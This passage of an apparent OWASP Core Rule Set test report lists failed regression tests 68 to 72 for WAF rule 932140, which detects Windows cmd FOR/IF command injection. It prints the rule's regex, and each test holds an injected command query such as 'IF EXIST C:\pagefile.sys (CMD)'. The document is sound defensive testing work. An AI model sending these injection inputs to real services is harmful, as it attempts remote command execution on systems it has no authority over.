    "test_rule" : "932140",
    "test_id" : 68,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 68,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+filename+++++++++%28CMD%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 69,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 69,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+data.xls+++++++++Echo+The+file+was+found.",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 70,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 70,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+MyFile.txt+++++++%28ECHO+Some%5Bmore%5DPotatoes%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 71,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 71,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+C%3A%5Cpagefile.sys++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 72,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 72,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+C%3A%5Cpagefile.sys++%28CMD%29+ELSE+%28CMD%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
